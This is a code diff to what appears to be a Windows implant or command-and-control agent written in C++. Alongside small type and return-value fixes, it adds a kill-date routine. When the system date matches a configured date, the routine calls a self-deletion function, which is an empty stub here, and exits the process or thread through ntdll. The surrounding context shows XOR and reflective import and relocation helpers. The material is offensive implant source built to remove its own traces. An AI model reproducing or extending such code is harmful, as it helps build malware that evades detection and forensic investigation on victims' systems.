@@ -10,9 +10,9 @@ auto DECLFN Useful::NtStatusToError(
 }
 
 auto DECLFN Useful::Xor( 
-    _In_opt_ PBYTE  Bin, 
+    _In_opt_ BYTE*  Bin, 
     _In_     SIZE_T BinSize, 
-    _In_     PBYTE  Key, 
+    _In_     BYTE*  Key, 
     _In_     SIZE_T KeySize 
 ) -> VOID {
     for ( SIZE_T i = 0x00, j = 0x00; i < BinSize; i++, j++ ) {
@@ -111,6 +111,50 @@ auto DECLFN Useful::FixImp(
 	}
 	
 	return TRUE;
+}
+
+auto DECLFN Useful::SelfDelete( VOID ) -> BOOL {
+
+}
+
+auto DECLFN Useful::CheckKillDate( VOID ) -> VOID {
+    SYSTEMTIME SystemTime  = { 0 };
+    BOOL       SelfDeleted = FALSE;
+
+    if ( Self->Session.KillDate.Enabled ) {
+        Self->Krnl32.GetSystemTime( &SystemTime );
+
+        KhDbg( 
+            "the current system date is %d-%d-%d | format year-month-day",
+            SystemTime.wYear, SystemTime.wMonth, SystemTime.wDay
+        );
+        KhDbg(
+            "kill date is set to %d-%d-%d | format year-month-day",
+            Self->Session.KillDate.Year, Self->Session.KillDate.Month, Self->Session.KillDate.Day
+        );
+
+        if (
+            SystemTime.wDay   == Self->Session.KillDate.Day   &&
+            SystemTime.wMonth == Self->Session.KillDate.Month &&
+            SystemTime.wYear  == Self->Session.KillDate.Year
+        ) {
+            KhDbg( "match kill date with current system date" );
+            KhDbg( "self-deletion enabled: %s", Self->Session.KillDate.SelfDelete ? "true":"false" );
+            KhDbg( "exit choosed is: %s", Self->Session.KillDate.ExitProc ? "process":"thread" );
+            KhDbg( "starting self deletion and stop the process" );
+
+            SelfDeleted = Self->Usf->SelfDelete();
+
+            KhDbg( "self-deleted: %s", SelfDeleted ? "true":"false" );
+            KhDbg( "exiting the %s with EXIT_SUCCESS code", Self->Session.KillDate.ExitProc ? "process":"thread" );
+
+            if ( Self->Session.KillDate.ExitProc ) {
+                Self->Ntdll.RtlExitUserProcess( EXIT_SUCCESS );
+            } else {
+                Self->Ntdll.RtlExitUserThread( EXIT_SUCCESS );
+            }
+        }
+    }
 }
 
 auto DECLFN Useful::FixRel(
@@ -214,8 +258,8 @@ auto DECLFN Mem::Copy(
     _In_ PVOID Src,
     _In_ ULONG Size
 ) -> PVOID {
-    PBYTE D = (PBYTE)Dst;
-	PBYTE S = (PBYTE)Src;
+    BYTE* D = (BYTE*)Dst;
+	BYTE* S = (BYTE*)Src;
 
 	while (Size--)
 		*D++ = *S++;
@@ -227,7 +271,7 @@ auto DECLFN Mem::Set(
     _In_ UPTR Val,
     _In_ UPTR Size
 ) -> void {
-    PULONG Dest = (PULONG)Addr;
+    ULONG* Dest = (ULONG*)Addr;
 	SIZE_T Count = Size / sizeof(ULONG);
 
 	while ( Count > 0 ) {
@@ -385,14 +429,14 @@ auto DECLFN Str::ConcatA(
     PCHAR  Dest, 
     LPCSTR Src 
 ) -> PCHAR {
-    Str::CopyA( Dest + Str::LengthA(Dest), Src );
+    return Str::CopyA( Dest + Str::LengthA(Dest), Src );
 }
 
 auto DECLFN Str::ConcatW( 
     PWCHAR  Dest, 
     LPCWSTR Src 
 ) -> PWCHAR {
-    Str::CopyW( Dest + Str::LengthW(Dest), Src );
+    return Str::CopyW( Dest + Str::LengthW(Dest), Src );
 }
 
 auto DECLFN Str::IsEqual( 
